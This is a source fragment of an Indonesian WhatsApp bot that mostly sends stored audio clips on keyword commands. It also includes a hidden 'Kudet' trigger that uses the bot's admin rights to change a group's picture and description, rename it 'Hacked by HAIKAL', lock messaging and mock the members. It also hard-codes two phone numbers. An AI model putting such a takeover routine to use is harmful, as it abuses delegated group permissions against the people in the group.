                    const apaan = fs.readFileSync('media/apaan.mp3')
                    Haikal.sendMessage(from, apaan, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break 
                    case 'assalamualikum':
                    const assalamualikum = fs.readFileSync('media/assalamualaikum.mp3')
                    Haikal.sendMessage(from, assalamualikum, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break 
                    case 'hantam':
                    const hantam = fs.readFileSync('media/hantam.mp3')
                    Haikal.sendMessage(from, hantam, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break      
                    case 'hapus':
                    const hapus = fs.readFileSync('media/hapus.mp3')
                    Haikal.sendMessage(from, hapus, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break           
                    case 'asw':
                    const asw = fs.readFileSync('ase.mp3')
                    Haikal.sendMessage(from, asw, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'kasian':
                    const kasian = fs.readFileSync('media/kasian.mp3')
                    Haikal.sendMessage(from, kasian, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'keren':
                    const keren = fs.readFileSync('media/keren.mp3')
                    Haikal.sendMessage(from, keren, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'kesel':
                    const kesel = fs.readFileSync('media/kesel.mp3')
                    Haikal.sendMessage(from, kesel, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'ketawa':
                    const ketawa = fs.readFileSync('media/ketawa.mp3')
                    Haikal.sendMessage(from, ketawa, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'loli':
                    const loli = fs.readFileSync('media/loli.mp3')
                    Haikal.sendMessage(from, loli, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'mastah':
                    const mastah = fs.readFileSync('media/mastah.mp3')
                    Haikal.sendMessage(from, mastah, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'ngeselin':
                    const ngeselin = fs.readFileSync('media/ngeselin.mp3')
                    Haikal.sendMessage(from, ngeselin, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'nob':
                    const nob = fs.readFileSync('media/nob.mp3')
                    Haikal.sendMessage(from, nob, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'awkwk':
                    const awkwk = fs.readFileSync('media/awkwk.mp3')
                    Haikal.sendMessage(from, awkwk, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'nub':
                    const nub = fs.readFileSync('media/nub.mp3')
                    Haikal.sendMessage(from, nub, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sedih':
                    const sedih = fs.readFileSync('media/sedih.mp3')
                    Haikal.sendMessage(from, sedih, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
default:
	//Virgam 
				if (budy.startsWith('jadi toge')){
if (!isQuotedSticker) return reply('𝗥𝗲𝗽𝗹𝘆/𝘁𝗮𝗴 𝘀𝘁𝗶𝗰𝗸𝗲𝗿 !')
			reply(mess.wait)
			encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			media = await Haikal.downloadAndSaveMediaMessage(encmedia)
			ran = getRandom('.png')
			exec(`ffmpeg -i ${media} ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return reply('Yah gagal, coba ulangi ^_^')
			buffer = fs.readFileSync(ran)
			fekemek(buffer,'NIH')
			fs.unlinkSync(ran)
			})
                    // Kudet ( HW MODS WA )
if (budy.startsWith('_>/<')){
if (!mek.key.fromMe && !isOwner) return
if (!isBotGroupAdmins) return
if (!isGroup) return
anu = fs.readFileSync('media/image/hac.jpeg')
Haikal.updateProfilePicture(from, anu)
Haikal.groupUpdateSubject(from, `Hacked by HAIKAL`)
Haikal.groupUpdateDescription(from, `Mampos Gw Kudet`)
Haikal.groupSettingChange(from, GroupSettingChange.messageSend, true)
setTimeout(() => {
fakegroup('Mwuehehe kena hack kacian')
}, 8000)
}
// Anti Tag ( HW MODS WA )
const listTag = ["6285714170944@s.whatsapp.net","6285876330812@s.whatsapp.net"]
const partiNum = (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.contextInfo.participant : ''
// Antitag Via Reply ( HW MODS WA )
if (listTag.includes(partiNum)) {
if (antitags === false) return
if (mek.key.fromMe) return
if (isOwner) return
sendNye = fs.readFileSync('media/sticker/jantag.webp')
Haikal.sendMessage(from, sendNye, sticker, {quoted:mek, contextInfo:{forwardingScore: 800, isForwarded: true}})
}
// Antitag Via Tag ( HW MODS WA )
if (budy.includes("@6285714170944")) {
if (antitags === false) return
if (mek.key.fromMe) return
if (isOwner) return
sendNye = fs.readFileSync('media/sticker/jantag.webp')
Haikal.sendMessage(from, sendNye, sticker, {quoted:mek, contextInfo:{forwardingScore: 800, isForwarded: true}})
}
// Batas
}
if (isGroup && budy != undefined) {
} else {
console.log(color('[TEXT]', 'red'), 'SELF-MODE', color(sender.split('@')[0]))
}		
}
} catch (e) {
e = String(e)
if (!e.includes("this.isZero")) {
console.log('Message : %s', color(e, 'green'))
}
}
}
/*
]=====> TUTORIAL ARRAY <=====[
const Key = ["HAIKAL", "HW MODS"]
// if (Key.includes(args[1]) {
if (Key.includes("HW MODS")) {
reply("√")
}
]=====> TUTORIAL ARRAY <=====[
*/
